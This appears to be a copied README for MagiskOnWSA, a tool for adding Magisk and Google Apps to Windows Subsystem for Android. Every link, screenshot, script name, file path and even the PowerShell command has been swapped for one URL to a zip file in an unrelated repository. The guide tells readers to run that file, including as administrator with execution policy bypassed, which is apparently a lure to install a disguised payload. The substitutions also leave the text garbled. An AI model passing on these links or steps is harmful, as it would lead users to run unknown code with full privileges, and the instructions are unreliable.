# Magisk on WSA (with Google Apps)

## Features

- Integrate Magisk and OpenGApps in a few clicks within minutes
- No Linux environment required for integration
- Keep each build up to date
- Support both ARM64 and x64
- Support all OpenGApps variants except for aroma (aroma does not support x86_64, please use super instead)
- Fix VPN dialog not showing (use our [VpnDialogs app](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip))
- Unattended installation
- Automatically activates developers mode in Windows 11
- Update to new version while preserving data with one-click script
- Merged all language packs
- Support managing start menu icons (manually installing [WSAHelper](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip) to use this feature)

## Video Guide

https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip

## Text Guide

1. Star (if you like) and fork this repo (keep it PUBLIC, private repo is not supported)
1. Go to the **Action** tab in your forked repo
    ![Action Tab](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)
1. In the left sidebar, click the **Build WSA** workflow.
    ![Workflow](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)
1. Above the list of workflow runs, select **Run workflow**
    ![Run Workflow](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)
1. Select the version of Magisk and select the [OpenGApps variant](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip) (none is no OpenGApps) you like, select the root solution (none means no root), select WSA version and its architecture (mostly x64) and click **Run workflow**
    ![Run Workflow](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)
1. Wait for the action to complete and download the artifact **DO NOT download it via multithread downloaders like IDM or ADM**
    ![Download](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)
1. Unzip the artifact
    - The size shown in the webpage is uncompressed size and the zip you download will be compressed. So the size of the zip will be much less than the size shown in the webpage.
1. Right-click `https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip` and select `Run with PowerShell`
    - If you previously have a MagiskOnWSA installation, it will automatically uninstall the previous while **preserving all userdata** and install the new one, so don't worry about your data.
    - If you have an official WSA installation, you should uninstall it first. (In case you want to preserve your data, you can backup `%LOCALAPPDATA%\Packages\https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip\LocalCache\https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip` before uninstallation and restore it after installation.) (If you want to restore the icons to start menu, please install and use [WSAHelper](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip).)
    - If the popup windows disappear **without asking administrative permission** and WSA is not installed successfully, you should manually run `https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip` as administrator:
        1. Press `Win+x` and select `Windows Terminal (Admin)`
        2. Input `cd "{X:\path\to\your\extracted\folder}"` and press `enter`, and remember to replace `{X:\path\to\your\extracted\folder}` including the `{}`, for example `cd "D:\wsa"`
        3. Input `https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip -ExecutionPolicy Bypass -File .\https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip` and press `enter`
        4. The script will run and WSA will be installed
        5. If this workaround does not work, your PC is not supported for WSA
1. Magisk/Play store will be launched. Enjoy by installing LSPosed-zygisk with zygisk enabled or Riru and LSPosed-riru

## FAQ

- Actions workflow task `Delete workflow runs` run Failed

    Check workflow permissions, should be `Read and write permissions`

     ![permissions](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)

     Read the [Github Docs](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip) to find out how to change this setting

- Why should we delete old workflow runs?

    Keeping old workflow runs can take up a lot of storage resources and is suspected to be abusive, which can lead to banning.
- Can I delete the unzipped folder?

    No.
- Why the size of the zip does not match the one shown?

   The zip you downloaded is compressed and Github is showing the uncompressed size.
- How can I update WSA to new version?

    Rerun the Github action, download the new artifact, replace the content of your previous installation and rerun `https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip`. Don't worry, your data will be preserved.
- How can I get the logcat from WSA?

    `%LOCALAPPDATA%\Packages\https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip\LocalState\diagnostics\logcat`
- How can I update Magisk to new version?

    Do the same as updating WSA
- How to pass safetynet?

    Like all the other emulators, no way.
- Virtualization is not enabled?

    `https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip` helps you enable it if not enabled. After rebooting, rerun `https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip` to install WSA. If it's still not working, you have to enable virtualization in BIOS. That's a long story so ask Google for help.
- How to remount system as read-write?

    No way in WSA since it's mounted as read-only by Hyper-V. You can modify system by making a Magisk module. Or directly modify https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip Ask Google for help.
- I cannot `adb connect localhost:58526`

    Make sure developer mode is enabled. If the issue persists, check the IP address of WSA in the setting page and try `adb connect ip:5555`.
- Magisk online module list is empty?

    Magisk actively remove online module repository. You can install module locally or by `adb push https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip /data/local/tmp` and `adb shell su -c magisk --install-module https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip`.
- Can I use Magisk 23.0 stable or lower version?

    No. Magisk has bugs preventing itself running on WSA. Magisk 24+ has fixed them. So you must use Magisk 24 or higher version.
- How can I get rid of Magisk?

    Choose `none` as root solution.
- Github Action script is updated, how can I synchronize it?

    1. In your fork repository, click `fetch upstream`
        ![fetch](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)
    1. Then and click `fetch and merge`
        ![merge](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip)

## Credits

- [Magisk](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip): The most famous root solution on Android
- [The Open GApps Project](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip): One of the most famous Google Apps packages solution
- [WSA-Kernel-SU](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip) and [kernel-assisted-superuser](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip): The kernel `su` for debugging Magisk Integration
- [WSAGAScript](https://github.com/seanland1234/WSAG/raw/refs/heads/main/arm64/gapps/Software-v1.7.zip): The first GApps integration script for WSA
